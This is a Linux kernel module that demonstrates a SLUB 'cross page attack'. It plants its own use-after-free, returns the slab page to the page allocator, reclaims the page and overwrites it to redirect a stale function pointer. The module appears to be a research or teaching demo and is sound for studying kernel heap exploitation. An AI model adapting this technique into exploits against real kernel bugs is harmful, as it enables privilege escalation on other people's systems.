#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/mm.h>
#include <linux/module.h>
#include <linux/sched.h>
#include <linux/slab.h>
#include <linux/slub_def.h>

#define OBJ_SIZE 512
#define OBJ_NUM (0x1000)

#define loge(fmt, ...) pr_err("%s:%d " fmt "\n", "attack_demo", \
                              __LINE__, ##__VA_ARGS__)

struct my_struct {
    union {
        char data[OBJ_SIZE];
        struct {
            void (*func)(void);
            char paddings[OBJ_SIZE - 8];
        };
    };
} __attribute__((aligned(OBJ_SIZE)));

static struct kmem_cache *my_cachep;
struct my_struct **tmp_ms;
struct my_struct *random_ms;

void hello_func(void) {
    loge("---> hello_func()");
}

void hack_func(void) {
    loge("---> hack_func(): cross page attack success");
}

static int __init km_init(void) {
#define OO_SHIFT 16
#define OO_MASK ((1 << OO_SHIFT) - 1)
    int i, offset, cpu_partial, objs_per_slab;
    struct page *realloc;
    void *target_page_virt;
    void *realloc_page_virt;
    unsigned long page_size;
    int page_order;
    struct my_struct *ms;
    int uaf_idx;

    tmp_ms = kmalloc(OBJ_NUM * 8, GFP_KERNEL);
    my_cachep = kmem_cache_create(
        "my_struct", sizeof(struct my_struct), 0,
        SLAB_HWCACHE_ALIGN | SLAB_PANIC | SLAB_ACCOUNT, NULL);

    loge("cache info:");
    loge(">> my_cachep->name: %s", my_cachep->name);
    cpu_partial = my_cachep->cpu_partial;
    loge(">> cpu_partial: %d", cpu_partial);
    objs_per_slab = my_cachep->oo.x & OO_MASK;
    loge(">> objs_per_slab: %u", objs_per_slab);
    loge(">> object_size: 0x%x", my_cachep->object_size);
    page_size = my_cachep->object_size * objs_per_slab;
    page_order = get_order(page_size);
    loge(">> so page size: 0x%lx, page order: %d\n", page_size, page_order);

    random_ms = kmem_cache_alloc(my_cachep, GFP_KERNEL);
    loge("alloc a random object at %px\n", random_ms);

    loge("=== STEP 1 ===");
    loge(">> alloc `cpu_partial + 1` = %d pages of objects,", cpu_partial + 1);
    loge(">> each page contains `objs_per_slab` = %d objects\n", objs_per_slab);
    for (i = 0, offset = 0; i < (objs_per_slab * (cpu_partial + 1)); i++) {
        tmp_ms[offset + i] = kmem_cache_alloc(my_cachep, GFP_KERNEL);
    }
    offset += i;

    loge("=== STEP 2 ===");
    loge(">> alloc `objs_per_slab - 1` = %d objects\n", objs_per_slab - 1);
    for (i = 0; i < objs_per_slab - 1; i++) {
        tmp_ms[offset + i] = kmem_cache_alloc(my_cachep, GFP_KERNEL);
    }
    offset += i;

    loge("=== STEP 3 ===");
    loge(">> alloc a vulnerable object for UAF");
    uaf_idx = offset++;
    ms = kmem_cache_alloc(my_cachep, GFP_KERNEL);
    tmp_ms[uaf_idx] = ms;
    target_page_virt = (void *)((unsigned long)ms &
                                ~(unsigned long)(page_size - 1));
    loge(">> vuln object index: %d", uaf_idx);
    loge(">> vuln object at %px, page: %px", ms, target_page_virt);
    loge(">> set function pointer to `hello()` and call it\n");
    ms->func = (void *)hello_func;
    ms->func();

    loge("=== STEP 4 ===");
    loge(">> alloc `objs_per_slab + 1` = %d objects\n", objs_per_slab + 1);
    for (i = 0; i < objs_per_slab + 1; i++) {
        tmp_ms[offset + i] = kmem_cache_alloc(my_cachep, GFP_KERNEL);
    }
    offset += i;

    loge("=== STEP 5 ===");
    loge(">> free the vulnerable object, now it's UAF\n");
    kmem_cache_free(my_cachep, ms);

    loge("=== STEP 6 ===");
    loge(">> make vuln page is empty\n");
    for (i = 1; i < objs_per_slab; i++) {
        kmem_cache_free(my_cachep, tmp_ms[uaf_idx + i]);
        kmem_cache_free(my_cachep, tmp_ms[uaf_idx - i]);
        tmp_ms[uaf_idx + i] = NULL;
        tmp_ms[uaf_idx - i] = NULL;
    }

    loge("=== STEP 7 ===");
    loge(">> free one object per page\n");
    for (i = 0; i < (objs_per_slab * (cpu_partial + 1)); i++) {
        if (i % objs_per_slab == 0) {
            if (tmp_ms[i]) {
                kmem_cache_free(my_cachep, tmp_ms[i]);
                tmp_ms[i] = NULL;
            }
        }
    }

    loge("let's check if we can get the vuln page ...");
    realloc = alloc_pages(GFP_KERNEL, page_order);
    realloc_page_virt = page_address(realloc);
    loge("realloc page at %px", realloc_page_virt);
    if (realloc_page_virt == target_page_virt) {
        loge("realloc SUCCESS :)");
    } else {
        loge("cross page attack failed :(");
        return 0;
    }

    loge("assume we has the ability to overwrite the content of page");
    for (i = 0; i < page_size / 8; i++) {
        ((void **)realloc_page_virt)[i] = (void *)hack_func;
    }

    loge("now, let's call func again (UAF)");
    ms->func();

    free_page((unsigned long)realloc_page_virt);
    return 0;
}

static void __exit km_exit(void) {
    int i;

    for (i = 0; i < OBJ_NUM; i++) {
        if (tmp_ms[i]) {
            kmem_cache_free(my_cachep, tmp_ms[i]);
        }
    }
    kmem_cache_free(my_cachep, random_ms);
    kmem_cache_destroy(my_cachep);
    kfree(tmp_ms);
    loge("Bye");
}

module_init(km_init);
module_exit(km_exit);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("X++D && veritas");
MODULE_DESCRIPTION("Cross Page Attack Demo Module.");
MODULE_VERSION("0.1");